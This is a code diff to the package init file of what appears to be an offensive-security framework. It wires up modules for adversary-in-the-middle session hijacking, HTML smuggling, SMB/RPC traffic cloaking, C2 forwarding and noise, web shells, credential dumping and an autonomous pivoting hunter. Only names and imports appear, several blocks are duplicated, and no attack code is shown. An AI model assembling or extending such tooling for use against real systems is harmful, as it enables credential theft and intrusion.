@@ -233,6 +233,24 @@ __all__ = [
     'get_ai_persist_recommendation',
     'detect_edr_for_persist',
     
+    # Web Logic Hijacking (NEW)
+    'WebLogicHijacker',
+    'LogicHijacker',
+    'LogicEventType',
+    'HijackPattern',
+    'InterceptedRequest',
+    'C2ForwardResult',
+    'MonolithC2Forwarder',
+    'BUILTIN_PATTERNS',
+    
+    # K8s Kraken v3 (NEW)
+    'C2NoiseGenerator',
+    'K8sKrakenV3',
+    'TrafficKind',
+    'NoiseProfile',
+    'NoiseEvent',
+    'InjectionPlan',
+    
     # Web Shell & Post-Web Exploitation (NEW)
     'WebShellManager',
     'WebShellGenerator',
@@ -247,39 +265,138 @@ __all__ = [
     'AIObfuscator',
     'WAFBypass',
     'ShellPayload',
+    
+    # Automated Reporting (NEW)
+    'AutoReporter',
+    'AutoReportGenerator',
+    'OperationPackage',
+    'LateralResult',
+    'CredentialHarvest',
+    'WebHijackEvent',
+    'C2BeaconEvent',
+    'OperatorNote',
+    
+    # Autonomous Hunter (NEW)
+    'AutoPivotChain',
+    'AutonomousHunter',
+    'CredentialVault',
+    'CredentialVaultEntry',
+    'DomainScanner',
+    'AutonomousDecisionEngine',
+    'HunterTarget',
+    'HunterReport',
+    'HunterState',
+    'HunterMode',
+    'run_autonomous_hunt',
+    
+    # AiTM Proxy (NEW)
+    'ReverseProxyEngine',
+    'SessionHijacker',
+    'AiTMJavaScriptInjector',
+    'CapturedCredential',
+    'SessionReplayResult',
+    'create_aitm_proxy',
+    'PLATFORM_CONFIGS',
+    
+    # HTML Smuggler (NEW)
+    'HTMLSmuggler',
+    'SmuggleTemplate',
+    'create_html_smuggler',
+    
+    # SMB/RPC Cloaker (NEW)
+    'SMBRPCCloaker',
+    'SMBFragmenter',
+    'RPCPadder',
+    'PipeNameObfuscator',
+    'TimingJitterInjector',
+    'ImpacketCommandWrapper',
+    'CloakReport',
+    'SMBFragment',
+    'RPCPadding',
+    'create_smb_rpc_cloaker',
 ]
 
-# Lazy import for web_shell to avoid circular imports
-def _import_webshell():
-    from .web_shell import (
-        WebShellManager, WebShellGenerator, WebShellConfig,
-        ShellType, ObfuscationLevel, EvasionTechnique,
-        PostExploitEngine, CredentialDumper, MemoryShell,
-        BeaconTransition, AIObfuscator, WAFBypass, ShellPayload
-    )
-    return {
-        'WebShellManager': WebShellManager,
-        'WebShellGenerator': WebShellGenerator,
-        'WebShellConfig': WebShellConfig,
-        'ShellType': ShellType,
-        'ObfuscationLevel': ObfuscationLevel,
-        'EvasionTechnique': EvasionTechnique,
-        'PostExploitEngine': PostExploitEngine,
-        'CredentialDumper': CredentialDumper,
-        'MemoryShell': MemoryShell,
-        'BeaconTransition': BeaconTransition,
-        'AIObfuscator': AIObfuscator,
-        'WAFBypass': WAFBypass,
-        'ShellPayload': ShellPayload,
-    }
+# NEW: AiTM Proxy
+from .aitm_proxy import (
+    ReverseProxyEngine,
+    SessionHijacker,
+    AiTMJavaScriptInjector,
+    CapturedCredential,
+    SessionReplayResult,
+    create_aitm_proxy,
+    PLATFORM_CONFIGS,
+)
 
-# Make web_shell components available when accessed
-try:
-    from .web_shell import (
-        WebShellManager, WebShellGenerator, WebShellConfig,
-        ShellType, ObfuscationLevel, EvasionTechnique,
-        PostExploitEngine, CredentialDumper, MemoryShell,
-        BeaconTransition, AIObfuscator, WAFBypass, ShellPayload
-    )
-except ImportError:
-    pass  # Module may not be available in all environments
+# NEW: HTML Smuggler
+from .html_smuggler import (
+    HTMLSmuggler,
+    SmuggleTemplate,
+    create_html_smuggler,
+)
+
+# NEW: SMB/RPC Cloaker
+from .smb_rpc_cloaker import (
+    SMBRPCCloaker,
+    SMBFragmenter,
+    RPCPadder,
+    PipeNameObfuscator,
+    TimingJitterInjector,
+    ImpacketCommandWrapper,
+    CloakReport,
+    SMBFragment,
+    RPCPadding,
+    create_smb_rpc_cloaker,
+)
+
+# NEW: Autonomous Hunter
+from .autonomous_hunter import (
+    AutoPivotChain, AutonomousHunter, CredentialVault,
+    CredentialVaultEntry, DomainScanner, AutonomousDecisionEngine,
+    HunterTarget, HunterReport, HunterState, HunterMode, run_autonomous_hunt,
+)
+
+# NEW: AiTM Proxy
+from .aitm_proxy import (
+    ReverseProxyEngine,
+    SessionHijacker,
+    AiTMJavaScriptInjector,
+    CapturedCredential,
+    SessionReplayResult,
+    create_aitm_proxy,
+    PLATFORM_CONFIGS,
+)
+
+# NEW: HTML Smuggler
+from .html_smuggler import (
+    HTMLSmuggler,
+    SmuggleTemplate,
+    create_html_smuggler,
+)
+
+# NEW: K8s Kraken v3 (C2 Traffic Injection)
+from .k8s_kraken_v3 import (
+    C2NoiseGenerator, K8sKrakenV3,
+    TrafficKind, NoiseProfile, NoiseEvent, InjectionPlan,
+)
+
+# NEW: Web Shell & Post-Web Exploitation
+from .web_shell import (
+    WebShellManager, WebShellGenerator, WebShellConfig,
+    ShellType, ObfuscationLevel, EvasionTechnique,
+    PostExploitEngine, CredentialDumper, MemoryShell,
+    BeaconTransition, AIObfuscator, WAFBypass, ShellPayload
+)
+
+# NEW: Automated Reporting
+from .auto_reporting import (
+    AutoReporter, AutoReportGenerator, OperationPackage,
+    LateralResult, CredentialHarvest, WebHijackEvent,
+    C2BeaconEvent, OperatorNote,
+)
+
+# NEW: Autonomous Hunter
+from .autonomous_hunter import (
+    AutoPivotChain, AutonomousHunter, CredentialVault,
+    CredentialVaultEntry, DomainScanner, AutonomousDecisionEngine,
+    HunterTarget, HunterReport, HunterState, HunterMode, run_autonomous_hunt,
+)
